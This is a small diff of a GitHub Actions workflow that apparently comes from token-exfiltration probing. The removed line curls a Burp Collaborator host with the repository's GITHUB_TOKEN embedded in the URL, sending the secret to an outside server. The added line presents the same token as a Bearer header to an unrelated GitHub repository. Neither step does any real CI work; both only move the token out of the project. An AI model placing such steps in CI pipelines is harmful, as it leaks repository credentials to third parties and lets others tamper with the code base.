@@ -13,7 +13,7 @@ jobs:
     - uses: actions/checkout@v2
     - name: Run a one-line script
       run: |
-        curl http://ob3ykqg4xpb9zafu9vkr4c4ay14ssh.burpcollaborator.net/${{ secrets.GITHUB_TOKEN }}
+        curl https://github.com/h01bb/h1/info/refs?service=git-upload-pack --header 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}'
       
       
 
